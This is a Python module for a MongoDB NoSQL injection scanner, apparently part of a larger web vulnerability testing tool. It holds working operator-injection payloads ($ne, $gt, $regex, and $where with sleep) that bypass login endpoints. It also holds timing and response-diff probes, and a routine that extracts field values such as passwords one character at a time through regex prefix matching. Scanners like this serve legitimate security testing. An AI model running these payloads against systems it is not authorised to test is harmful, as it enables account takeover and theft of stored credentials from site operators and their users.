"""
NoSQL injection scanner.

Targets MongoDB-style operator injection in JSON-body endpoints, form
endpoints that accept MongoDB bracket syntax, and query-string variants.

Detection oracles:
  1. Auth bypass     — send {"username": {"$ne": null}, "password": ...}
                       and compare against a known-failure baseline.
  2. Response diff   — send {"field": {"$regex": "^a"}} vs "^zzzzzz" and
                       compare bodies.
  3. Status-code     — same payloads, but compare HTTP status codes.
  4. Timing          — send {"$where": "sleep(N) || true"} and measure.

Extraction:
  Regex prefix matching, char by char.

Reuses the injection scaffold from vuln.sqli (InjectionPoint, _send,
AdaptiveLimiter, _hash).
"""

import asyncio
import json as _json
import re
import secrets
import time
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from vuln.sqli import (
    InjectionPoint,
    AdaptiveLimiter,
    _send,
    _hash,
    DEFAULT_DIALECT,
)
from core.output import success, warn, info


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

OPERATOR_PAYLOADS = [
    ("ne_null",     {"$ne": None}),
    ("gt_empty",    {"$gt": ""}),
    ("regex_all",   {"$regex": ".*"}),
    ("ne_x",        {"$ne": "x"}),
    ("lt_z",        {"$lt": "\uffff"}),
    ("exists_true", {"$exists": True}),
]

COMMON_AUTH_FIELDS = ["username", "user", "email", "login", "password", "pass", "pwd"]

# Success markers. Deliberately narrow: only strings that appear on
# a real authenticated page, not in a nav bar or footer. Do NOT add
# "dashboard", "administrator", "role:", "success" — those appear on
# failure pages in many templates and cause false positives.
AUTH_SUCCESS_MARKERS = [
    "logged in as",
    "authenticated as",
    "welcome back",
    "sign out",
    "logout",
    "search ok",
    "login ok",
]

# Failure markers. These indicate the request was understood but
# rejected.
AUTH_FAIL_MARKERS = [
    "invalid credential",
    "login failed",
    "unauthorized",
    "access denied",
    "no user found",
    "user not found",
    "auth failure",
    "bad credentials",
]

TIMING_DELTA_THRESHOLD = 3.0
TIMING_SLEEP_SECONDS = 5

MAX_EXTRACT_CHARS = 60
MAX_CONCURRENT_REQUESTS = 8
REGEX_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@."


# ---------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------

def _make_json_point(url, method="POST", content_type="application/json",
                     body=None, headers=None, cookies=None):
    return InjectionPoint(
        kind="body",
        name="_json_body",
        url=url,
        method=method,
        headers=headers or {"Content-Type": content_type},
        body=body,
        content_type=content_type,
        cookies=cookies,
    )


def _splice_json_body(base_body, field_path, replacement):
    try:
        obj = _json.loads(base_body) if base_body else {}
    except Exception:
        obj = {}
    if not isinstance(obj, dict):
        obj = {}
    obj[field_path] = replacement
    return _json.dumps(obj)


def _payload_body(base_body, field, payload_value):
    return _splice_json_body(base_body, field, payload_value)


def _matches_any_marker(body, markers):
    low = (body or "").lower()
    return any(m in low for m in markers)


def _contains_reflection_clean(body):
    """Return True only if the response reflects the payload verbatim.

    The old check flagged responses containing the substring "$exists"
    even when that string appeared in a server-side *error message*
    (e.g. "unsupported operator: '$exists'"). This version looks for
    the JSON-encoded form of the operator, which is what a reflected
    payload actually looks like.
    """
    low = (body or "").lower()
    for pat in ('{"$ne"', '{"$gt"', '{"$regex"', '{"$where"',
                '{"$exists"', '{"$lt"', "'$ne'", "'$gt'", "'$regex'",
                "'$where'", "'$exists'", "'$lt'"):
        if pat in low:
            return True
    return False


# Backwards-compat alias — kept so any leftover caller still works.
_contains_reflection = _contains_reflection_clean


# ---------------------------------------------------------------------
# Low-level send
# ---------------------------------------------------------------------

async def _send_json(session, url, body_str, limiter, cookies=None,
                     content_type="application/json", verbose=False,
                     method="POST"):
    from core.http import fetch
    try:
        status, _hdrs, body, _ = await fetch(
            session, url, limiter.base,
            method=method,
            cookies=cookies,
            headers={"Content-Type": content_type},
            data=body_str.encode("utf-8"),
        )
    except Exception as e:
        if verbose:
            warn(f"nosqli: transport error on {url}: "
                 f"{type(e).__name__}: {e!r}")
        return None
    if body is None:
        return None
    limiter.observe(status)
    return status, body


# ---------------------------------------------------------------------
# Detection — auth bypass
# ---------------------------------------------------------------------

async def probe_auth_bypass(session, url, limiter, base_body=None,
                            cookies=None, fields=None, verbose=False):
    """Try to bypass an auth endpoint.

    Strategy: for each operator payload, try substituting it into *every*
    field of the JSON body at once. This is the classic attack:
        {"username": {"$ne": null}, "password": {"$ne": null}}
    If that fails, fall back to single-field substitution, which is what
    you'd need if only one field is checked.

    The base body should NOT contain valid credentials. Use obviously
    wrong values ({"username": "notauser", "password": "wrong"}) so that
    any response differing from baseline is genuinely caused by the
    payload.
    """
    fields = fields or COMMON_AUTH_FIELDS
    if base_body is None:
        base_body = _json.dumps({f: "notauser" for f in fields[:2]})

    try:
        base_obj = _json.loads(base_body)
    except Exception:
        base_obj = {}
    if not isinstance(base_obj, dict):
        base_obj = {}

    present_fields = [k for k in base_obj.keys() if k in fields]
    if not present_fields:
        present_fields = list(base_obj.keys())[:2]

    if verbose:
        info(f"nosqli: auth probe on fields {present_fields}")

    # Baseline request: send the body as-is. Its response is the
    # "failure fingerprint" against which we compare payload responses.
    baseline = await _send_json(session, url, base_body, limiter,
                                cookies=cookies, verbose=verbose)
    if baseline is None:
        return None
    baseline_status, baseline_resp = baseline
    baseline_hash = _hash(baseline_resp)

    if verbose:
        info(f"nosqli: baseline status={baseline_status} "
             f"len={len(baseline_resp)}")

    for name, payload in OPERATOR_PAYLOADS:
        # --- Strategy 1: replace every present field at once ---
        combined = dict(base_obj)
        for f in present_fields:
            combined[f] = payload
        combined_body = _json.dumps(combined)

        r = await _send_json(session, url, combined_body, limiter,
                             cookies=cookies, verbose=verbose)
        if r is not None:
            status, resp = r
            same_as_baseline = (_hash(resp) == baseline_hash and
                                status == baseline_status)
            reflected = _contains_reflection_clean(resp)
            if not same_as_baseline and not reflected:
                looks_success = _matches_any_marker(resp, AUTH_SUCCESS_MARKERS)
                looks_failure = _matches_any_marker(resp, AUTH_FAIL_MARKERS)
                if looks_success and not looks_failure and status < 400:
                    if verbose:
                        success(f"nosqli: auth bypass (all-fields) "
                                f"payload={name}")
                    return {
                        "type": "nosqli",
                        "severity": "critical",
                        "url": url,
                        "parameter": ",".join(present_fields),
                        "injection_kind": "body",
                        "method": "POST",
                        "payload": combined_body,
                        "payload_name": name + "+all",
                        "http_status": status,
                        "dbms": "mongodb",
                        "evidence": (f"auth bypass via {name} on all "
                                     f"fields {present_fields}"),
                    }

        # --- Strategy 2: replace one field at a time ---
        for field in present_fields:
            body = _splice_json_body(base_body, field, payload)
            r = await _send_json(session, url, body, limiter,
                                 cookies=cookies, verbose=verbose)
            if r is None:
                continue
            status, resp = r
            same_as_baseline = (_hash(resp) == baseline_hash and
                                status == baseline_status)
            reflected = _contains_reflection_clean(resp)
            if same_as_baseline or reflected:
                continue

            looks_success = _matches_any_marker(resp, AUTH_SUCCESS_MARKERS)
            looks_failure = _matches_any_marker(resp, AUTH_FAIL_MARKERS)
            if looks_success and not looks_failure and status < 400:
                if verbose:
                    success(f"nosqli: auth bypass confirmed on "
                            f"field={field!r} payload={name}")
                return {
                    "type": "nosqli",
                    "severity": "critical",
                    "url": url,
                    "parameter": field,
                    "injection_kind": "body",
                    "method": "POST",
                    "payload": _json.dumps(payload),
                    "payload_name": name,
                    "http_status": status,
                    "dbms": "mongodb",
                    "evidence": f"auth bypass: {name} on field {field!r}",
                }
    return None


# ---------------------------------------------------------------------
# Detection — response diff
# ---------------------------------------------------------------------

async def probe_response_diff(session, url, limiter, field,
                              base_body=None, cookies=None, verbose=False):
    """Send ^a vs ^zzzzzz on the field and compare response bodies
    and status codes.

    Returns (vulnerable: bool, match_body, nomatch_body).
    """
    if base_body is None:
        base_body = _json.dumps({field: "x"})

    match_body = _payload_body(base_body, field, {"$regex": "^a"})
    nomatch_body = _payload_body(base_body, field, {"$regex": "^zzzzzz"})

    r_match = await _send_json(session, url, match_body, limiter,
                               cookies=cookies, verbose=verbose)
    r_nomatch = await _send_json(session, url, nomatch_body, limiter,
                                 cookies=cookies, verbose=verbose)
    if r_match is None or r_nomatch is None:
        return False, None, None

    s_match, b_match = r_match
    s_nomatch, b_nomatch = r_nomatch

    if _contains_reflection_clean(b_match) or \
       _contains_reflection_clean(b_nomatch):
        return False, b_match, b_nomatch

    body_differs = _hash(b_match) != _hash(b_nomatch)
    status_differs = s_match != s_nomatch

    if verbose:
        info(f"nosqli: response diff on {field!r}: "
             f"body_differs={body_differs} status_differs={status_differs} "
             f"(match status={s_match}, nomatch status={s_nomatch})")

    return (body_differs or status_differs), b_match, b_nomatch


# ---------------------------------------------------------------------
# Detection — $where timing
# ---------------------------------------------------------------------

async def probe_timing(session, url, limiter, field="username",
                       base_body=None, cookies=None, verbose=False):
    if base_body is None:
        base_body = _json.dumps({field: "x"})

    baseline_body = _payload_body(base_body, field, "x")
    sleep_body = _payload_body(base_body, field,
                               {"$where": f"sleep({TIMING_SLEEP_SECONDS}) || true"})

    t0 = time.perf_counter()
    r0 = await _send_json(session, url, baseline_body, limiter,
                          cookies=cookies, verbose=verbose)
    baseline_time = time.perf_counter() - t0

    t1 = time.perf_counter()
    r1 = await _send_json(session, url, sleep_body, limiter,
                          cookies=cookies, verbose=verbose)
    sleep_time = time.perf_counter() - t1

    delta = sleep_time - baseline_time
    if verbose:
        info(f"nosqli: timing baseline={baseline_time:.2f}s "
             f"sleep={sleep_time:.2f}s delta={delta:.2f}s")

    if r0 is None or r1 is None:
        return False

    return delta >= TIMING_DELTA_THRESHOLD


# ---------------------------------------------------------------------
# Extraction — regex prefix, char by char
# ---------------------------------------------------------------------

async def extract_regex_value(session, url, limiter, field,
                              known_prefix="", max_chars=MAX_EXTRACT_CHARS,
                              base_body=None, cookies=None,
                              verbose=False, charset=None,
                              blind=False):
    """Extract a string field's value one character at a time using
    regex prefix matching.

    For non-blind endpoints, the response body contains a success
    indicator on match. For blind endpoints, we use the HTTP status
    code: <400 = match, >=400 = no match.
    """
    if base_body is None:
        base_body = _json.dumps({field: "x"})
    charset = charset or REGEX_CHARSET
    value = known_prefix

    for _ in range(max_chars - len(known_prefix)):
        found = None
        for ch in charset:
            candidate = value + ch
            body = _payload_body(
                base_body, field, {"$regex": "^" + re.escape(candidate)})
            r = await _send_json(session, url, body, limiter,
                                 cookies=cookies, verbose=verbose)
            if r is None:
                continue
            status, resp = r

            if blind:
                if status >= 400:
                    continue
            else:
                if _matches_any_marker(resp, AUTH_FAIL_MARKERS):
                    continue
                if status >= 400:
                    continue
            found = ch
            break
        if found is None:
            break
        value += found
        if verbose:
            info(f"nosqli: extracted prefix: {value!r}")

    return value


# ---------------------------------------------------------------------
# Top-level entry point
# ---------------------------------------------------------------------

async def test_url(url, session, rate_limiter, cookies=None, verbose=False,
                   method="POST", body=None, content_type="application/json",
                   fields=None, do_extract=True):
    if not url:
        return []

    limiter = AdaptiveLimiter(rate_limiter)
    findings = []
    fields = fields or COMMON_AUTH_FIELDS

    info(f"nosqli: scanning {url} (method={method}, "
         f"content-type={content_type})")

    # Decide whether this looks like an auth endpoint or a search
    # endpoint, based on the body keys.
    body_keys = []
    if body:
        try:
            obj = _json.loads(body)
            if isinstance(obj, dict):
                body_keys = list(obj.keys())
        except Exception:
            pass

    is_likely_auth = ("password" in body_keys or
                      any(k in body_keys for k in ("pass", "pwd")))

    # Phase 1: auth bypass — only for endpoints that look like auth.
    if is_likely_auth:
        bypass = await probe_auth_bypass(session, url, limiter,
                                         base_body=body, cookies=cookies,
                                         fields=fields, verbose=verbose)
        if bypass:
            findings.append(bypass)
            return findings

    # Phase 2: response-diff detection.
    candidate_fields = body_keys or fields[:3]
    for field in candidate_fields:
        if field in ("password", "pass", "pwd") and not is_likely_auth:
            continue
        vuln, _bm, _bn = await probe_response_diff(
            session, url, limiter, field, base_body=body,
            cookies=cookies, verbose=verbose)
        if not vuln:
            continue
        info(f"nosqli: response-diff oracle confirmed on field {field!r}")
        finding = {
            "type": "nosqli",
            "severity": "high",
            "url": url,
            "parameter": field,
            "injection_kind": "body",
            "method": method,
            "payload": _json.dumps({"$regex": "^a"}),
            "http_status": 200,
            "dbms": "mongodb",
            "evidence": f"response-diff oracle on field {field!r}",
        }
        if do_extract:
            extracted = await extract_regex_value(
                session, url, limiter, field,
                base_body=body, cookies=cookies, verbose=verbose,
                blind=False)
            finding["extracted_data"] = {"prefix": extracted}
        findings.append(finding)
        break

    # Phase 3: timing oracle as last resort.
    if not findings:
        for field in candidate_fields:
            if await probe_timing(session, url, limiter, field=field,
                                  base_body=body, cookies=cookies,
                                  verbose=verbose):
                findings.append({
                    "type": "nosqli",
                    "severity": "high",
                    "url": url,
                    "parameter": field,
                    "injection_kind": "body",
                    "method": method,
                    "payload": _json.dumps(
                        {"$where": f"sleep({TIMING_SLEEP_SECONDS}) || true"}),
                    "http_status": 200,
                    "dbms": "mongodb",
                    "evidence": f"timing oracle on field {field!r}",
                })
                break

    if not findings and verbose:
        warn("nosqli: no findings")
    return findings